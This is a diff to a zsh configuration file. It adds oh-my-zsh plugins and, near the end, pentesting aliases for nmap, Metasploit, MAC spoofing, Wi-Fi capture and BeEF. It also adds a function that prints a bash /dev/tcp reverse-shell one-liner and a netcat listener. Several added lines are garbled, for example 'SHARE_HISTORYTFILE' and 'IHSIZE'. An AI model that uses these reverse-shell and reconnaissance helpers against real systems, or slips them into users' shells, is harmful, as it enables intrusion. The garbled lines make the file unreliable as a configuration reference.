@@ -1,5 +1,29 @@
 #~/.zshrc file for zsh interactive shells.
+# Add these lines near the top of your .zshrc file, after the existing setopt commands
 
+# Path to your oh-my-zsh installation.
+#export3# ZSH="$HOME/.oh-my-zsh"
+# Set name of the theme to load
+#ZSH_THEME="robbyrussell"
+
+# Plugin list
+plugins=(
+  git
+  colored-man-pages
+  command-not-found
+  extract
+  sudo
+  history
+  dirhistory
+  copypath
+  copyfile
+  web-search
+  urltools
+  zsh-syntax-highlighting
+  zsh-autosuggestions
+)
+
+#source $ZSH/oh-my-z.sh
 # Enable features and set options
 setopt autocd              # change directory just by typing its name
 setopt interactivecomments # allow comments in interactive mode
@@ -180,3 +204,40 @@ export LESS_TERMCAP_ue=$'\E[0m'        # reset underline
 export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'
 # END USER CONFIGURATION
 term
+
+source ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
+#source ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh
+#setopt SHARE_HISTORYTFILE=~/.zsh_history
+#IHSIZE=10000
+#SAVEHIST=10000# Add these lines at the end of your .zshrc file, after the existing content
+
+# Pentesting-specific aliases
+alias nmap-quick='sudo nmap -sV -O -F --version-light'
+alias nmap-full='sudo nmap -sV -O -p- -v'
+alias metasploit='msfconsole'
+alias set-mac='sudo macchanger -r eth0'
+alias wifi-scan='sudo airodump-ng wlan0mon'
+alias start-beef='sudo beef-xss'
+
+# Function to start a simple HTTP server
+function http-server() {
+  local port="${1:-8000}"
+  python3 -m http.server "$port"
+}
+
+# Function to generate a reverse shell payload
+function rev-shell() {
+  local ip="${1:-$(ip addr show tun0 | grep -Po 'inet \K[\d.]+')}"
+  local port="${2:-4444}"
+  echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
+}
+
+# Function to start a listener
+function listener() {
+  local port="${1:-4444}"
+  nc -lvnp "$port"
+}
+
+# Keep existing source commands for syntax highlighting and autosuggestions
+# source ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
+# source ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh
